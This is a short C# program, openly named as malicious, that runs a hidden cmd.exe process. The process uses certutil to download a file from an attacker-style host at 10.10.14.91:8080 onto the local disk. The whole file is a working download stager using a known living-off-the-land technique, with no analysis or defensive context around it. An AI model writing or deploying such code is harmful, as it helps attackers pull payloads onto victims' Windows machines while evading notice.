using System;
using System.Diagnostics;

namespace MaliciousNamespace
{
    class Program
    {
        static void Main(string[] args)
        {
            // The malicious command using certutil to download a file from a remote server
            string command = "certutil -urlcache -split -f http://10.10.14.91:8080/log.txt C:\\temp\\log.txt";

            try
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process process = Process.Start(processStartInfo);
                process.WaitForExit();

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                Console.WriteLine("Download Output: " + output);
                if (!string.IsNullOrEmpty(error))
                {
                    Console.WriteLine("Error: " + error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }
    }
}
